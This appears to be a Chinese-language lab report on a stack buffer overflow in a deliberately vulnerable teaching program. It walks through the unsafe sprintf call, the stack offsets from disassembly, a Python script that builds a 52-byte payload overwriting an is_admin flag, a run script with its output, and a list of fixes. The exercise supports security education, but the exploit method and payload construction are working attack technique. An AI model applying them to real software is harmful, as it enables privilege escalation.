# SSEx_vul 漏洞机理分析与利用报告

实验环境：NixOS / Linux  
编译工具：Clang 16  
复现程序：`SSEx_vul_linux_exploit.c`

## 1. 漏洞位置

核心漏洞位于 `process_user_data()`：

```c
struct locals
{
    char user_buffer[64];
    int is_admin;
};

int process_user_data(const char* username, const char* data)
{
    struct locals state = { 0 };

    if (username && data)
    {
        state.is_admin = !strcasecmp(username, ADMIN);
        sprintf(state.user_buffer, "User=%s, Data=%s", username, data);
        printf("Processing: %s\n", state.user_buffer);
    }

    return state.is_admin;
}
```

危险调用是：

```c
sprintf(state.user_buffer, "User=%s, Data=%s", username, data);
```

`sprintf` 不检查目标缓冲区大小。`username` 来自命令行参数，`data` 来自文件内容，攻击者可以控制这两个输入，从而覆盖 `user_buffer` 后面的 `is_admin`。

次要漏洞位于 `business_logic_handler()`：

```c
char file[256];
sprintf(file, "%s_data.txt", user);
```

`user` 长度不受限制，也存在栈溢出风险，但本次利用主要使用第一处 `sprintf` 覆盖局部变量。

## 2. 漏洞成因与详细机理

`business_logic_handler()` 首先根据用户名构造文件名：

```c
sprintf(file, "%s_data.txt", user);
fp = fopen(file, "r");
```

当用户名为 `test` 时，程序打开 `test_data.txt`。

随后：

```c
fgets(buffer, sizeof(buffer)-1, fp);
fclose(fp);
result = process_user_data(user, buffer);
```

`fgets` 本身限制了 `buffer` 的最大读取长度为 255 字节，但随后 `process_user_data()` 中的 `sprintf` 把 `data` 写入只有 64 字节的 `state.user_buffer`，从而造成栈缓冲区溢出。

### 2.1 Linux 下的栈布局

在 Linux x86_64、Clang `-O0`、关闭栈保护的编译条件下，反汇编结果如下：

```asm
state 起始地址 = rbp - 0x58
user_buffer   = rbp - 0x58
is_admin      = rbp - 0x18
```

关键汇编片段：

```asm
; 初始化 state，大小为 0x44 = 68 字节
lea     rdi, [rbp-0x58]
xor     esi, esi
mov     edx, 0x44
call    memset

; 将判断结果写入 is_admin
mov     DWORD PTR [rbp-0x18], eax

; sprintf 从 user_buffer 开始写
lea     rdi, [rbp-0x58]
...
call    sprintf

; 函数最后从 is_admin 读取返回值
mov     eax, DWORD PTR [rbp-0x18]
```

所以从 `user_buffer` 到 `is_admin` 的偏移为：

```text
0x58 - 0x18 = 0x40 = 64 字节
```

### 2.2 格式化输出长度计算

当用户名为 `test` 时，`sprintf` 的格式为：

```text
User=%s, Data=%s
```

对应输出：

```text
User=test, Data=<data>
```

固定前缀长度：

```text
"User="    5 字节
"test"     4 字节
", Data="  7 字节
合计      16 字节
```

因此 `data` 的第 0 个字节写入 `user_buffer` 偏移 16 的位置。

要覆盖 `is_admin`，需要从 `user_buffer` 写到偏移 64，所以文件内容需要：

```text
64 - 16 = 48 字节填充
```

之后再写入 `is_admin` 的 4 字节。

### 2.3 为什么正常输入无法触发

正常逻辑下，`is_admin` 只有两种可能：

```text
非管理员：is_admin = 0
管理员：  is_admin = 1
```

但判断条件是：

```c
if (result == 0x19224)
{
    printf("Admin privileges activated!\n");
}
```

`0x19224` 是一个固定魔数，正常逻辑不可能返回该值。只有通过栈溢出把 `is_admin` 覆盖为 `0x19224`，才能进入该分支。

## 3. 利用过程

### 3.1 构造二进制 payload

目标值为：

```c
0x19224
```

在 32 位小端序下的字节表示为：

```text
24 92 01 00
```

文件 `test_data.txt` 的内容为：

```text
48 个 0x41（字符 'A'）
+
24 92 01 00
```

完整二进制内容：

```text
41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
24 92 01 00
```

### 3.2 payload 生成脚本

`gen_payload.py`：

```python
from pathlib import Path

USER = "test"
MAGIC = 0x19224
BUFFER_TO_IS_ADMIN = 0x48 - 0x8

prefix = f"User={USER}, Data=".encode("ascii")
filler_len = BUFFER_TO_IS_ADMIN - len(prefix)

payload = b"A" * filler_len + MAGIC.to_bytes(4, "little")
Path(f"{USER}_data.txt").write_bytes(payload)
```

运行后生成 52 字节的 `test_data.txt`。

### 3.3 内存覆盖过程

`sprintf` 把 `data` 写入 `state.user_buffer` 时，内存覆盖关系如下：

```text
user_buffer 偏移 0~15   : "User=test, Data="
user_buffer 偏移 16~63  : 48 个 'A'
user_buffer 偏移 64~67  : 24 92 01 00
                         ^^^^^^^^^^^^^^^^
                         is_admin
```

`data` 的第 48~51 字节正好对应 `user_buffer` 偏移 64~67，也就是 `is_admin` 的 4 个字节。

小端序读取后：

```text
is_admin = 0x00019224
```

因此 `process_user_data()` 返回 `0x19224`。

### 3.4 触发条件

`business_logic_handler()` 中：

```c
result = process_user_data(user, buffer);

if (result == 0x19224)
{
    printf("Admin privileges activated!\n");
    system("true");
}
```

`result` 等于 `0x19224`，条件成立，程序输出：

```text
Admin privileges activated!
```

### 3.5 一键运行

在 `Software` 目录执行：

```bash
bash run_linux_exploit.sh
```

脚本会依次：

1. 使用 Clang 编译 `SSEx_vul_linux_exploit.c`。
2. 使用 `gen_payload.py` 生成 `test_data.txt`。
3. 以非管理员身份 `test` 运行程序。

实际运行结果：

```text
[+] buffer -> is_admin offset : 64 bytes
[+] format prefix length       : 16 bytes
[+] filler length              : 48 bytes
[+] generated test_data.txt, 52 bytes
Linux Buffer Overflow Demonstration
===================================
Usage: SSEx_vul_linux_exploit ID

user: test
Processing: User=test, Data=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$...
Admin privileges activated!
```

`Processing` 行中的 `$` 是十六进制 `0x24`，后面的乱码是 `0x92`、`0x01` 等不可打印字符，这是正常的。

## 4. 利用结论

在非管理员用户名 `test` 下，程序并未通过正常的身份判断，而是通过文件内容造成栈溢出，将 `is_admin` 覆盖为魔数 `0x19224`，最终成功输出：

```text
Admin privileges activated!
```

利用成功。

## 5. 修复建议

1. 使用 `snprintf` 代替 `sprintf`：

```c
snprintf(state.user_buffer, sizeof(state.user_buffer),
         "User=%s, Data=%s", username, data);
```

2. 限制文件内容长度，确保格式化后不超过目标缓冲区。
3. 校验 `username` 和文件名拼接长度。
4. 开启栈保护，例如编译时使用 `-fstack-protector`。
5. 检查 `snprintf` 返回值，判断是否发生截断。
